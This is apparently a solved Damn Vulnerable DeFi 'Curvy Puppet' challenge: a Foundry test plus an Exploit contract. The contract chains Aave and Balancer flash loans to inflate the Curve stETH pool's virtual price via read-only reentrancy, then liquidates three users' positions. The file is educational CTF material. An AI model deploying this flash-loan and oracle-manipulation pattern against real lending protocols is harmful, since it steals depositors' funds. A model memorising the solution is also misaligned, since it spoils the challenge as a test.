// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork(("https://rpc.ankr.com/eth"), 20190356);

         startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }


    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 curveLpToken = IERC20(curvePool.lp_token());

        Exploit exploit = new Exploit(curvePool, lending, curveLpToken, address(player), TREASURY_LP_BALANCE,stETH,weth,address(treasury),dvt);
        // Transfer LP tokens and WETH to the exploit contract
        curveLpToken.transferFrom(address(treasury), address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(address(treasury), address(exploit), TREASURY_WETH_BALANCE);
        
        exploit.executeExploit();
 
    
    }
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}
interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface IBalancerVault {

    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

}
contract Exploit {
    IStableSwap public curvePool;
    CurvyPuppetLending public lending;
    IERC20 public curveLpToken;
    address public player;
    uint256 public treasuryLpBalance;
    IERC20 stETH;
    WETH weth;
    address treasury;
    DamnValuableToken dvt;
        IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
        IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
        IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    constructor(
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IERC20 _curveLpToken,
        address _player,
        uint256 _treasuryLpBalance,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        DamnValuableToken _dvt

    ) {
        curvePool = _curvePool;
        lending = _lending;
        curveLpToken = _curveLpToken;
        player = _player;
        treasuryLpBalance = _treasuryLpBalance;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        dvt = _dvt;
    }

    function manipulateCurvePool() public {
        // Step 1: Add liquidity to the Curve pool
        weth.withdraw(58685 ether);

        console.log("LP token price before removing liquidity:", curvePool.get_virtual_price());
        // To call the exchange function of the Curve Pool to swap ETH for stETH.
        stETH.approve(address(curvePool),type(uint256).max);

        uint256[2] memory amount;
        amount[0] = 58685 ether;
        amount[1] = stETH.balanceOf(address(this));
        console.log("my weth balance",weth.balanceOf(address(this)));
        console.log("my eth balance",address(this).balance);
        curvePool.add_liquidity{value: 58685 ether}(amount, 0);

        uint256 virtualPrice = curvePool.get_virtual_price();

        console.log("LP token price after add liquidity:", virtualPrice);

        
    }

    function removeLiquidity() public {
        // Step 2: Remove liquidity from the Curve pool
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        uint256 lpBalance = curveLpToken.balanceOf(address(this));

        curvePool.remove_liquidity(lpBalance - 3000000000000000001, min_amounts);  // Removing liquidity

        console.log("LP token price after2 removing liquidity:", curvePool.get_virtual_price());
    }

    function executeExploit() public {
        //weth.withdraw(200 ether);    
        // Allow lending contract to pull collateral
        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
 
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: 5e18,
            expiration: uint48(block.timestamp)
        });
        stETH.approve(address(AaveV2), type(uint256).max);
        weth.approve(address(AaveV2), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172000 * 1e18;
        amounts[1] = 20500 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
 
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
        weth.transfer(treasury,weth.balanceOf(address(this)));
        curveLpToken.transfer(treasury,1);
        dvt.transfer(treasury,7500e18);


    }
    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        console.log("AAVE flashloan stETH balance:",stETH.balanceOf(address(this)));
        console.log(" wETH balancer:",weth.balanceOf(address(Balancer)));      
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        manipulateCurvePool();
        removeLiquidity();

        weth.deposit{value: 37991 ether}();
        weth.transfer(address(Balancer), 37991 ether);

        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1; 
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
        weth.deposit{value: 20518 ether}();
            console.log(" stETH balance2:",stETH.balanceOf(address(this)));
            console.log(" wETH balance2:",weth.balanceOf(address(this)));         
            console.log(" ETH balance2:",(address(this).balance));
            console.log(" my LP balance2:", curveLpToken.balanceOf(address(this)));
        
         


    }
    // Receive function to handle ETH
    receive() external payable {
         if (msg.sender == address(curvePool)) {
            console.log("LP token price during removing liquidity:", curvePool.get_virtual_price());
        address[3] memory users = [
            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,  // Alice
            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,  // Bob
            0xea475d60c118d7058beF4bDd9c32bA51139a74e0   // Charlie
        ];
        console.log("msg.sender",address(this));
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
            console.log("Liquidated user:", users[i]);
        }

         }
    }
}
